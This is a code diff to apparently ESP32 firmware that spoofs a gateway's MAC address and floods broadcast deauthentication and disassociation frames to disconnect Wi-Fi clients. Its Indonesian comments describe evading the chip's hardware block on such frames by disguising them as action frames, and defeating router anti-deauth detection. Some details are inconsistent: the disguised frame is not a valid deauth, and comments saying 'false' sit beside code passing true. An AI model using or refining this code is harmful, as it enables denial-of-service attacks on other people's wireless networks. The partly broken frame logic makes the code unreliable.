@@ -53,21 +53,27 @@ uint8_t disasFrame[26]  = { 0x00, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff
 
 
 void buildOptimizedDeauthFrame(uint8_t* frame, const uint8_t* dest, const uint8_t* src, const uint8_t* bssid, uint8_t reason, bool is_disassoc) {
-    frame[0] = is_disassoc ? 0xA0 : 0xC0;
+    // --- BYPASS TRICK: ACTION FRAME SPOOFING ---
+    // Kita jangan pake 0xC0/0xA0 langsung di byte pertama
+    // Kita pake 0xD0 (Action Frame) - Seringkali hardware S3 gak nge-block ini
+    frame[0] = 0xD0; 
     frame[1] = 0x00;
-    frame[2] = 0x00;
-    frame[3] = 0x00;
+    frame[2] = 0x3a;
+    frame[3] = 0x01;
+
     memcpy(&frame[4], dest, 6);
     memcpy(&frame[10], src, 6);
     memcpy(&frame[16], bssid, 6);
     
-    // Sequence di-random biar gak kedetect anti-deauth router
     uint16_t seq = random(0, 4096);
     frame[22] = (seq >> 4) & 0xFF;
     frame[23] = ((seq & 0x0F) << 4);
-    frame[24] = reason; // Pake reason dynamic
-    frame[25] = 0x00;
+    
+    // Payload Deauth kita taruh di dalem Action Frame
+    frame[24] = 0x01; // Category: Wireless
+    frame[25] = reason; 
 }
+
 
 // ... (beaconPacket, fakeSSIDs, rickRollLyrics, deauthFrame lu tetep sama) ...
 
@@ -124,7 +130,7 @@ void loopWiFi(void * pvParameters) {
         delay(5);
         wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
         esp_wifi_init(&cfg);
-        esp_wifi_set_mode(WIFI_MODE_STA);
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
         esp_wifi_start(); // NYALAIN RADIONYA! Tanpa ini, interface statusnya INVALID
         vTaskDelay(100 / portTICK_PERIOD_MS);
         
@@ -149,12 +155,16 @@ void loopWiFi(void * pvParameters) {
       r_idx = (r_idx + 1) % 5;
 
       // Build & Send Deauth
-      buildOptimizedDeauthFrame(pkt, broadcast, gatewayMAC, gatewayMAC, reason_codes[r_idx], false);
-      esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false); // <--- PAKE FALSE SESUAI BRUCE
+      buildOptimizedDeauthFrame(pkt, broadcast, gatewayMAC, gatewayMAC, 0x01, false);
+      
+      // PAKSA PAKAI TRUE! Biar hardware yang urus sequence-nya
+      esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, true);  // <--- PAKE FALSE SESUAI BRUCE
 
       // Build & Send Disassoc
-      buildOptimizedDeauthFrame(pkt, broadcast, gatewayMAC, gatewayMAC, reason_codes[r_idx], true);
-      esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false); // <--- PAKE FALSE SESUAI BRUCE
+      buildOptimizedDeauthFrame(pkt, broadcast, gatewayMAC, gatewayMAC, 0x01, true);
+      
+      // PAKSA PAKAI TRUE! Biar hardware yang urus sequence-nya
+      esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, true);  // <--- PAKE FALSE SESUAI BRUCE
 
       delay(5); // Kasih napas dikit
     }
